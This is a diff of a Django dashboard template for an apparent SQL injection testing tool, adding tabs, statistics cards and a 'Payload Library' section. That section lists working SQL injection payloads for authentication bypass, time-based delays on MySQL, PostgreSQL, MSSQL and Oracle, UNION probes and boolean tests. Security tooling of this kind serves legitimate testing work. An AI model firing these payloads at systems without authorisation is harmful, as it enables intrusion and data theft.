@@ -3,226 +3,534 @@
 
 {% block title %}SQL Injection Attacker - Dashboard{% endblock %}
 
+{% block extra_style %}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="stylesheet" href="{% static 'sql_attacker/css/dashboard.css' %}">
+{% endblock %}
+
 {% block content %}
-<div class="container mt-4">
-    <h1 class="mb-4">SQL Injection Attacker Dashboard</h1>
+<div class="container-fluid" style="max-width: 1400px;">
+    <!-- Hero Section -->
+    <div class="dashboard-hero">
+        <h1><i class="fas fa-shield-alt"></i> SQL Injection Attacker Dashboard</h1>
+        <p>Modern security testing platform with integrated payload library</p>
+    </div>
     
-    <!-- Statistics Cards -->
+    <!-- Quick Stats Cards -->
     <div class="row mb-4">
-        <div class="col-md-3">
-            <div class="card bg-primary text-white">
+        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
+            <div class="stat-card gradient-primary">
                 <div class="card-body">
-                    <h5 class="card-title">Total Tasks</h5>
-                    <h2>{{ total_tasks }}</h2>
+                    <i class="fas fa-tasks stat-icon"></i>
+                    <div class="stat-label">Total Tasks</div>
+                    <div class="stat-number">{{ total_tasks }}</div>
                 </div>
             </div>
         </div>
-        <div class="col-md-3">
-            <div class="card bg-warning text-dark">
+        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
+            <div class="stat-card gradient-warning">
                 <div class="card-body">
-                    <h5 class="card-title">Pending</h5>
-                    <h2>{{ pending_tasks }}</h2>
+                    <i class="fas fa-clock stat-icon"></i>
+                    <div class="stat-label">Pending</div>
+                    <div class="stat-number">{{ pending_tasks }}</div>
                 </div>
             </div>
         </div>
-        <div class="col-md-3">
-            <div class="card bg-info text-white">
+        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
+            <div class="stat-card gradient-info">
                 <div class="card-body">
-                    <h5 class="card-title">Running</h5>
-                    <h2>{{ running_tasks }}</h2>
+                    <i class="fas fa-spinner stat-icon"></i>
+                    <div class="stat-label">Running</div>
+                    <div class="stat-number">{{ running_tasks }}</div>
                 </div>
             </div>
         </div>
-        <div class="col-md-3">
-            <div class="card bg-success text-white">
+        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
+            <div class="stat-card gradient-success">
                 <div class="card-body">
-                    <h5 class="card-title">Completed</h5>
-                    <h2>{{ completed_tasks }}</h2>
+                    <i class="fas fa-check-circle stat-icon"></i>
+                    <div class="stat-label">Completed</div>
+                    <div class="stat-number">{{ completed_tasks }}</div>
                 </div>
             </div>
         </div>
-    </div>
-    
-    <div class="row mb-4">
-        <div class="col-md-4">
-            <div class="card bg-danger text-white">
+        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
+            <div class="stat-card gradient-danger">
                 <div class="card-body">
-                    <h5 class="card-title">Failed Tasks</h5>
-                    <h2>{{ failed_tasks }}</h2>
+                    <i class="fas fa-exclamation-triangle stat-icon"></i>
+                    <div class="stat-label">Failed</div>
+                    <div class="stat-number">{{ failed_tasks }}</div>
                 </div>
             </div>
         </div>
-        <div class="col-md-4">
-            <div class="card bg-dark text-white">
+        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
+            <div class="stat-card gradient-dark">
                 <div class="card-body">
-                    <h5 class="card-title">Total Vulnerabilities</h5>
-                    <h2>{{ total_vulns }}</h2>
-                </div>
-            </div>
-        </div>
-        <div class="col-md-4">
-            <div class="card bg-danger text-white">
-                <div class="card-body">
-                    <h5 class="card-title">Exploitable</h5>
-                    <h2>{{ exploitable_vulns }}</h2>
+                    <i class="fas fa-bug stat-icon"></i>
+                    <div class="stat-label">Vulnerabilities</div>
+                    <div class="stat-number">{{ total_vulns }}</div>
                 </div>
             </div>
         </div>
     </div>
     
-    <!-- Action Buttons -->
-    <div class="mb-4">
-        <a href="{% url 'sql_attacker:task_create' %}" class="btn btn-primary btn-lg">
-            <i class="fas fa-plus"></i> Create New Attack Task
+    <!-- Quick Action Buttons -->
+    <div class="quick-actions">
+        <a href="{% url 'sql_attacker:task_create' %}" class="btn btn-primary btn-lg quick-action-btn">
+            <i class="fas fa-plus-circle"></i> Create New Attack
         </a>
-        <a href="{% url 'sql_attacker:task_list' %}" class="btn btn-secondary btn-lg">
-            <i class="fas fa-list"></i> View All Tasks
+        <a href="{% url 'sql_attacker:task_list' %}" class="btn btn-secondary btn-lg quick-action-btn">
+            <i class="fas fa-list-ul"></i> View All Tasks
         </a>
+        <button class="btn btn-info btn-lg quick-action-btn" onclick="document.querySelector('[data-tab-target=\'payload-library\']').click()">
+            <i class="fas fa-code"></i> Payload Library
+        </button>
     </div>
     
-    <!-- Injection Type Statistics -->
-    {% if injection_stats %}
-    <div class="card mb-4">
-        <div class="card-header">
-            <h5>Vulnerabilities by Injection Type</h5>
+    <!-- Tabbed Interface -->
+    <ul class="nav nav-tabs" role="tablist">
+        <li class="nav-item">
+            <a class="nav-link" data-tab-target="overview" href="#overview">
+                <i class="fas fa-chart-line"></i> Overview
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-tab-target="recent-tasks" href="#recent-tasks">
+                <i class="fas fa-tasks"></i> Recent Tasks
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-tab-target="payload-library" href="#payload-library">
+                <i class="fas fa-code"></i> Payload Library
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-tab-target="recent-findings" href="#recent-findings">
+                <i class="fas fa-bug"></i> Recent Findings
+            </a>
+        </li>
+    </ul>
+    
+    <!-- Tab Contents -->
+    <div class="tab-content" id="overview">
+        {% if injection_stats %}
+        <div class="dashboard-card">
+            <div class="dashboard-card-header">
+                <h5><i class="fas fa-chart-pie"></i> Vulnerabilities by Injection Type</h5>
+            </div>
+            <div class="dashboard-card-body">
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead>
+                            <tr>
+                                <th><i class="fas fa-tag"></i> Injection Type</th>
+                                <th><i class="fas fa-hashtag"></i> Count</th>
+                                <th><i class="fas fa-percentage"></i> Percentage</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for stat in injection_stats %}
+                            <tr>
+                                <td>{{ stat.injection_type|title }}</td>
+                                <td><span class="severity-badge severity-critical">{{ stat.count }}</span></td>
+                                <td>
+                                    {% widthratio stat.count total_vulns 100 %}%
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
         </div>
-        <div class="card-body">
-            <table class="table table-sm">
-                <thead>
-                    <tr>
-                        <th>Injection Type</th>
-                        <th>Count</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    {% for stat in injection_stats %}
-                    <tr>
-                        <td>{{ stat.injection_type|title }}</td>
-                        <td><span class="badge badge-danger">{{ stat.count }}</span></td>
-                    </tr>
+        {% else %}
+        <div class="empty-state">
+            <i class="fas fa-chart-bar"></i>
+            <h4>No Statistics Available</h4>
+            <p>Start testing to see vulnerability statistics</p>
+        </div>
+        {% endif %}
+        
+        <div class="dashboard-card">
+            <div class="dashboard-card-header">
+                <h5><i class="fas fa-info-circle"></i> Quick Start Guide</h5>
+            </div>
+            <div class="dashboard-card-body">
+                <ol style="line-height: 2;">
+                    <li><strong>Create a Task:</strong> Click "Create New Attack" to set up a SQL injection test</li>
+                    <li><strong>Configure Target:</strong> Enter the target URL and parameters to test</li>
+                    <li><strong>Select Attack Types:</strong> Choose error-based, time-based, or both</li>
+                    <li><strong>Execute:</strong> Run the attack and monitor progress</li>
+                    <li><strong>Review Results:</strong> Check findings in the Recent Findings tab</li>
+                    <li><strong>Use Payloads:</strong> Browse the Payload Library for manual testing</li>
+                </ol>
+            </div>
+        </div>
+    </div>
+    
+    <div class="tab-content hidden" id="recent-tasks">
+        <div class="dashboard-card">
+            <div class="dashboard-card-header">
+                <h5><i class="fas fa-tasks"></i> Recent Attack Tasks</h5>
+            </div>
+            <div class="dashboard-card-body">
+                {% if tasks %}
+                <div class="enhanced-table">
+                    <table class="table">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Target URL</th>
+                                <th>Method</th>
+                                <th>Status</th>
+                                <th>Vulnerabilities</th>
+                                <th>Created</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for task in tasks %}
+                            <tr>
+                                <td><strong>#{{ task.id }}</strong></td>
+                                <td>
+                                    <a href="{% url 'sql_attacker:task_detail' task.id %}" style="text-decoration: none; color: #667eea;">
+                                        {{ task.target_url|truncatechars:60 }}
+                                    </a>
+                                </td>
+                                <td><span class="severity-badge severity-medium">{{ task.http_method }}</span></td>
+                                <td>
+                                    {% if task.status == 'completed' %}
+                                    <span class="status-badge status-completed">
+                                        <i class="fas fa-check-circle"></i> Completed
+                                    </span>
+                                    {% elif task.status == 'running' %}
+                                    <span class="status-badge status-running">
+                                        <i class="fas fa-spinner"></i> Running
+                                    </span>
+                                    {% elif task.status == 'failed' %}
+                                    <span class="status-badge status-failed">
+                                        <i class="fas fa-times-circle"></i> Failed
+                                    </span>
+                                    {% else %}
+                                    <span class="status-badge status-pending">
+                                        <i class="fas fa-clock"></i> Pending
+                                    </span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    {% if task.vulnerabilities_found > 0 %}
+                                    <span class="severity-badge severity-critical">
+                                        <i class="fas fa-bug"></i> {{ task.vulnerabilities_found }}
+                                    </span>
+                                    {% else %}
+                                    <span class="severity-badge severity-low">
+                                        <i class="fas fa-shield-alt"></i> 0
+                                    </span>
+                                    {% endif %}
+                                </td>
+                                <td>{{ task.created_at|date:"Y-m-d H:i" }}</td>
+                                <td>
+                                    <a href="{% url 'sql_attacker:task_detail' task.id %}" 
+                                       class="btn btn-sm btn-primary action-btn">
+                                        <i class="fas fa-eye"></i> View
+                                    </a>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                {% else %}
+                <div class="empty-state">
+                    <i class="fas fa-tasks"></i>
+                    <h4>No Tasks Yet</h4>
+                    <p>Create your first attack task to get started!</p>
+                    <a href="{% url 'sql_attacker:task_create' %}" class="btn btn-primary">
+                        <i class="fas fa-plus"></i> Create Task
+                    </a>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+    
+    <div class="tab-content hidden" id="payload-library">
+        <div class="payload-library">
+            <h3 style="margin-bottom: 1.5rem;"><i class="fas fa-book"></i> SQL Injection Payload Library</h3>
+            
+            <!-- Search Box -->
+            <div class="payload-search">
+                <div class="search-wrapper">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="payloadSearch" placeholder="Search payloads... (Ctrl+K)" 
+                           class="form-control">
+                </div>
+                <small class="text-muted">
+                    <i class="fas fa-info-circle"></i> 
+                    Tip: Search by payload text, category (error, time, union, boolean), or database (mysql, postgresql, mssql, oracle)
+                </small>
+            </div>
+            
+            <!-- Error-Based Payloads -->
+            <div class="payload-category">
+                <div class="payload-category-header">
+                    <h4><i class="fas fa-exclamation-circle"></i> Error-Based SQL Injection</h4>
+                    <i class="fas fa-chevron-down collapse-icon"></i>
+                </div>
+                <div class="payload-category-content">
+                    {% for payload in "' OR '1'='1|' OR '1'='1'--|' OR '1'='1' /*|\" OR \"1\"=\"1|\", OR \"1\"=\"1\"--|') OR ('1'='1|\") OR (\"1\"=\"1|' AND '1'='2|admin'--|admin' #|admin'/*|' OR 'x'='x|') OR ('x')=('x|1' AND '1'='1|1' AND '1'='2|' UNION SELECT NULL--|' UNION SELECT NULL,NULL--|' UNION SELECT NULL,NULL,NULL--"%}
+                    <div class="payload-item">
+                        <code class="payload-code">{{ payload }}</code>
+                        <div class="payload-actions">
+                            <div class="payload-tags">
+                                <span class="payload-tag tag-error">Error-Based</span>
+                                <span class="payload-tag tag-all">All DBs</span>
+                            </div>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ payload }}', this)" 
+                                    title="Copy to clipboard">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                    </div>
                     {% endfor %}
-                </tbody>
-            </table>
-        </div>
-    </div>
-    {% endif %}
-    
-    <!-- Recent Tasks -->
-    <div class="card mb-4">
-        <div class="card-header">
-            <h5>Recent Attack Tasks</h5>
-        </div>
-        <div class="card-body">
-            {% if tasks %}
-            <div class="table-responsive">
-                <table class="table table-striped">
-                    <thead>
-                        <tr>
-                            <th>ID</th>
-                            <th>Target URL</th>
-                            <th>Method</th>
-                            <th>Status</th>
-                            <th>Vulnerabilities</th>
-                            <th>Created</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        {% for task in tasks %}
-                        <tr>
-                            <td>{{ task.id }}</td>
-                            <td>
-                                <a href="{% url 'sql_attacker:task_detail' task.id %}">
-                                    {{ task.target_url|truncatechars:50 }}
-                                </a>
-                            </td>
-                            <td><span class="badge badge-info">{{ task.http_method }}</span></td>
-                            <td>
-                                {% if task.status == 'completed' %}
-                                <span class="badge badge-success">{{ task.status }}</span>
-                                {% elif task.status == 'running' %}
-                                <span class="badge badge-info">{{ task.status }}</span>
-                                {% elif task.status == 'failed' %}
-                                <span class="badge badge-danger">{{ task.status }}</span>
-                                {% else %}
-                                <span class="badge badge-warning">{{ task.status }}</span>
-                                {% endif %}
-                            </td>
-                            <td>
-                                {% if task.vulnerabilities_found > 0 %}
-                                <span class="badge badge-danger">{{ task.vulnerabilities_found }}</span>
-                                {% else %}
-                                <span class="badge badge-secondary">0</span>
-                                {% endif %}
-                            </td>
-                            <td>{{ task.created_at|date:"Y-m-d H:i" }}</td>
-                            <td>
-                                <a href="{% url 'sql_attacker:task_detail' task.id %}" 
-                                   class="btn btn-sm btn-primary">View</a>
-                            </td>
-                        </tr>
-                        {% endfor %}
-                    </tbody>
-                </table>
+                </div>
             </div>
-            {% else %}
-            <p class="text-muted">No attack tasks yet. Create one to get started!</p>
-            {% endif %}
-        </div>
-    </div>
-    
-    <!-- Recent Results -->
-    {% if recent_results %}
-    <div class="card mb-4">
-        <div class="card-header">
-            <h5>Recent Vulnerability Findings</h5>
-        </div>
-        <div class="card-body">
-            <div class="table-responsive">
-                <table class="table table-striped">
-                    <thead>
-                        <tr>
-                            <th>ID</th>
-                            <th>Task</th>
-                            <th>Injection Type</th>
-                            <th>Parameter</th>
-                            <th>Database</th>
-                            <th>Exploitable</th>
-                            <th>Detected</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        {% for result in recent_results %}
-                        <tr>
-                            <td>{{ result.id }}</td>
-                            <td>
-                                <a href="{% url 'sql_attacker:task_detail' result.task.id %}">
-                                    Task {{ result.task.id }}
-                                </a>
-                            </td>
-                            <td><span class="badge badge-danger">{{ result.get_injection_type_display }}</span></td>
-                            <td>{{ result.vulnerable_parameter }}</td>
-                            <td>{{ result.database_type }}</td>
-                            <td>
-                                {% if result.is_exploitable %}
-                                <span class="badge badge-danger">Yes</span>
-                                {% else %}
-                                <span class="badge badge-secondary">No</span>
-                                {% endif %}
-                            </td>
-                            <td>{{ result.detected_at|date:"Y-m-d H:i" }}</td>
-                            <td>
-                                <a href="{% url 'sql_attacker:result_detail' result.id %}" 
-                                   class="btn btn-sm btn-primary">View</a>
-                            </td>
-                        </tr>
-                        {% endfor %}
-                    </tbody>
-                </table>
+            
+            <!-- Time-Based MySQL -->
+            <div class="payload-category">
+                <div class="payload-category-header">
+                    <h4><i class="fas fa-clock"></i> Time-Based SQL Injection - MySQL</h4>
+                    <i class="fas fa-chevron-down collapse-icon"></i>
+                </div>
+                <div class="payload-category-content">
+                    {% for payload in "' AND SLEEP(5)--|1' AND SLEEP(5)--|' OR SLEEP(5)--|1 AND SLEEP(5)|') AND SLEEP(5)--|' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"%}
+                    <div class="payload-item">
+                        <code class="payload-code">{{ payload }}</code>
+                        <div class="payload-actions">
+                            <div class="payload-tags">
+                                <span class="payload-tag tag-time">Time-Based</span>
+                                <span class="payload-tag tag-mysql">MySQL</span>
+                            </div>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ payload }}', this)"
+                                    title="Copy to clipboard">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <!-- Time-Based PostgreSQL -->
+            <div class="payload-category">
+                <div class="payload-category-header">
+                    <h4><i class="fas fa-clock"></i> Time-Based SQL Injection - PostgreSQL</h4>
+                    <i class="fas fa-chevron-down collapse-icon"></i>
+                </div>
+                <div class="payload-category-content">
+                    {% for payload in "' AND pg_sleep(5)--|1' AND pg_sleep(5)--|' OR pg_sleep(5)--|') AND pg_sleep(5)--"%}
+                    <div class="payload-item">
+                        <code class="payload-code">{{ payload }}</code>
+                        <div class="payload-actions">
+                            <div class="payload-tags">
+                                <span class="payload-tag tag-time">Time-Based</span>
+                                <span class="payload-tag tag-postgresql">PostgreSQL</span>
+                            </div>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ payload }}', this)"
+                                    title="Copy to clipboard">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <!-- Time-Based MSSQL -->
+            <div class="payload-category">
+                <div class="payload-category-header">
+                    <h4><i class="fas fa-clock"></i> Time-Based SQL Injection - MSSQL</h4>
+                    <i class="fas fa-chevron-down collapse-icon"></i>
+                </div>
+                <div class="payload-category-content">
+                    {% for payload in "'; WAITFOR DELAY '00:00:05'--|1'; WAITFOR DELAY '00:00:05'--|' WAITFOR DELAY '00:00:05'--|') WAITFOR DELAY '00:00:05'--"%}
+                    <div class="payload-item">
+                        <code class="payload-code">{{ payload }}</code>
+                        <div class="payload-actions">
+                            <div class="payload-tags">
+                                <span class="payload-tag tag-time">Time-Based</span>
+                                <span class="payload-tag tag-mssql">MSSQL</span>
+                            </div>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ payload }}', this)"
+                                    title="Copy to clipboard">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <!-- Time-Based Oracle -->
+            <div class="payload-category">
+                <div class="payload-category-header">
+                    <h4><i class="fas fa-clock"></i> Time-Based SQL Injection - Oracle</h4>
+                    <i class="fas fa-chevron-down collapse-icon"></i>
+                </div>
+                <div class="payload-category-content">
+                    {% for payload in "' AND DBMS_LOCK.SLEEP(5)--|1' AND DBMS_LOCK.SLEEP(5)--|') AND DBMS_LOCK.SLEEP(5)--"%}
+                    <div class="payload-item">
+                        <code class="payload-code">{{ payload }}</code>
+                        <div class="payload-actions">
+                            <div class="payload-tags">
+                                <span class="payload-tag tag-time">Time-Based</span>
+                                <span class="payload-tag tag-oracle">Oracle</span>
+                            </div>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ payload }}', this)"
+                                    title="Copy to clipboard">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <!-- Union-Based Payloads -->
+            <div class="payload-category">
+                <div class="payload-category-header">
+                    <h4><i class="fas fa-layer-group"></i> Union-Based SQL Injection</h4>
+                    <i class="fas fa-chevron-down collapse-icon"></i>
+                </div>
+                <div class="payload-category-content">
+                    {% for payload in "' UNION SELECT NULL--|' UNION SELECT NULL,NULL--|' UNION SELECT NULL,NULL,NULL--|' UNION SELECT NULL,NULL,NULL,NULL--|' UNION ALL SELECT NULL--|' UNION ALL SELECT NULL,NULL--|' ORDER BY 1--|' ORDER BY 2--|' ORDER BY 3--|' ORDER BY 10--|' UNION SELECT @@version--|' UNION SELECT database()--|' UNION SELECT user()--"%}
+                    <div class="payload-item">
+                        <code class="payload-code">{{ payload }}</code>
+                        <div class="payload-actions">
+                            <div class="payload-tags">
+                                <span class="payload-tag tag-union">Union</span>
+                                <span class="payload-tag tag-all">All DBs</span>
+                            </div>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ payload }}', this)"
+                                    title="Copy to clipboard">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <!-- Boolean-Based Payloads -->
+            <div class="payload-category">
+                <div class="payload-category-header">
+                    <h4><i class="fas fa-toggle-on"></i> Boolean-Based SQL Injection</h4>
+                    <i class="fas fa-chevron-down collapse-icon"></i>
+                </div>
+                <div class="payload-category-content">
+                    {% for payload in "' AND '1'='1|' AND '1'='2|' AND 'a'='a|' AND 'a'='b|1' AND '1'='1|1' AND '1'='2|') AND ('1'='1|') AND ('1'='2"%}
+                    <div class="payload-item">
+                        <code class="payload-code">{{ payload }}</code>
+                        <div class="payload-actions">
+                            <div class="payload-tags">
+                                <span class="payload-tag tag-boolean">Boolean</span>
+                                <span class="payload-tag tag-all">All DBs</span>
+                            </div>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ payload }}', this)"
+                                    title="Copy to clipboard">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
             </div>
         </div>
     </div>
-    {% endif %}
+    
+    <div class="tab-content hidden" id="recent-findings">
+        <div class="dashboard-card">
+            <div class="dashboard-card-header">
+                <h5><i class="fas fa-bug"></i> Recent Vulnerability Findings</h5>
+            </div>
+            <div class="dashboard-card-body">
+                {% if recent_results %}
+                <div class="enhanced-table">
+                    <table class="table">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Task</th>
+                                <th>Injection Type</th>
+                                <th>Parameter</th>
+                                <th>Database</th>
+                                <th>Exploitable</th>
+                                <th>Detected</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for result in recent_results %}
+                            <tr>
+                                <td><strong>#{{ result.id }}</strong></td>
+                                <td>
+                                    <a href="{% url 'sql_attacker:task_detail' result.task.id %}" 
+                                       style="text-decoration: none; color: #667eea;">
+                                        Task #{{ result.task.id }}
+                                    </a>
+                                </td>
+                                <td>
+                                    <span class="severity-badge severity-critical">
+                                        {{ result.get_injection_type_display }}
+                                    </span>
+                                </td>
+                                <td><code>{{ result.vulnerable_parameter }}</code></td>
+                                <td>
+                                    <span class="severity-badge severity-medium">
+                                        {{ result.database_type|upper }}
+                                    </span>
+                                </td>
+                                <td>
+                                    {% if result.is_exploitable %}
+                                    <span class="severity-badge severity-critical">
+                                        <i class="fas fa-bomb"></i> Yes
+                                    </span>
+                                    {% else %}
+                                    <span class="severity-badge severity-low">
+                                        <i class="fas fa-shield-alt"></i> No
+                                    </span>
+                                    {% endif %}
+                                </td>
+                                <td>{{ result.detected_at|date:"Y-m-d H:i" }}</td>
+                                <td>
+                                    <a href="{% url 'sql_attacker:result_detail' result.id %}" 
+                                       class="btn btn-sm btn-primary action-btn">
+                                        <i class="fas fa-eye"></i> View
+                                    </a>
+                                    <button class="btn btn-sm btn-info action-btn" 
+                                            onclick="copyToClipboard('{{ result.test_payload }}', this)"
+                                            title="Copy payload">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                {% else %}
+                <div class="empty-state">
+                    <i class="fas fa-shield-alt"></i>
+                    <h4>No Vulnerabilities Found Yet</h4>
+                    <p>Run attack tasks to discover vulnerabilities</p>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
 </div>
+{% endblock %}
+
+{% block extra_script %}
+<script src="{% static 'sql_attacker/js/dashboard.js' %}"></script>
 {% endblock %}
